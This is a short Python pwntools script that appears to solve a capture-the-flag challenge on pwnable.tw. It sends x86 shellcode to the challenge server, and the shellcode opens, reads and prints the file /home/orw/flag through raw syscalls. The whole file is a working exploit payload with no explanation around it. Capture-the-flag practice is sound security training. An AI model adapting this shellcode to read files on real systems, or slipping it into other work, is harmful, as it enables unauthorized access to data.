from pwn import *


shellcode = """
mov eax, 0x05
push %s
push %s
push %s
push %s
mov ebx, esp
xor ecx, ecx
xor edx, edx
int 0x80
mov ebx, eax
mov eax, 0x03
mov ecx, esp
mov edx, 0x30
int 0x80
xor ebx, ebx
mov eax, 0x04
int 0x80
""" % (u32("ag\0\0"), u32("w/fl"), u32("e/or"), u32("/hom"))

DEBUG_MODE = False

def setgdb(filename : str):
    p = process(filename)
    context.terminal = ["tmux", "splitw", "-h"]
    context.log_level = 'debug'
    gdb.attach(p)
    return p

if __name__ == '__main__':
    if(DEBUG_MODE):
        p = setgdb('')
    else:
        p = remote("chall.pwnable.tw", 10001)

    p.recv()
    p.send(asm(shellcode))

    p.interactive()
